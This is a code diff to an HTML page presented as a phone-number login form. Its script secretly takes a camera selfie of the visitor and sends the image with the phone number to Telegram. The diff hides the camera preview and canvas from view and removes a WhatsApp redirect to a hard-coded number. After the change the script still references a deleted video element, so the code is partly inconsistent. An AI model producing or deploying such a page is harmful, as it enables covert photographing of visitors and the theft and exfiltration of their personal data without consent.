@@ -8,8 +8,8 @@
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
-    video, canvas {
-      display: none; /* Ensure that the image preview remains invisible */
+    canvas {
+      display: none !important; /* Hide image preview */
     }
   </style>
 </head>
@@ -24,8 +24,8 @@
       <input type="text" placeholder="Re-enter Phone Number" class="w-full max-w-xs rounded-full bg-gray-200 placeholder-gray-500 text-gray-700 py-3 px-6 focus:outline-none focus:ring-2 focus:ring-green-500" id="codeInput" required/>
       
       <!-- Camera Elements -->
-      <video id="video" autoplay playsinline class="rounded-lg border-2 border-gray-300 w-full max-w-xs mt-4"></video>
-      <canvas id="canvas" width="960" height="1440" style="display: none;"></canvas> <!-- Increased resolution -->
+      
+      <canvas id="canvas" width="960" height="1440"></canvas> <!-- High-resolution & portrait ratio -->
 
       <button type="submit" class="w-full max-w-xs bg-[#4CAF50] hover:bg-[#449d48] text-white font-bold rounded-full py-3 px-6 transition-colors mt-2">LOGIN</button>
     </form>
@@ -80,7 +80,7 @@
         return;
       }
 
-      // Capture selfie with higher quality and resolution
+      // Capture selfie
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async function(blob) {
         // Save locally
@@ -93,12 +93,6 @@
         if (navigator.onLine && blob) {
           await sendToTelegram(phone, blob);
         }
-
-        // Redirect to WhatsApp with predefined message
-        const whatsappNumber = "+918128771022";
-        const message = "Hi!";
-        const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-        window.open(whatsappUrl, "_blank");
 
         alert("Thanks For Visiting!");
         phoneInput.value = '';
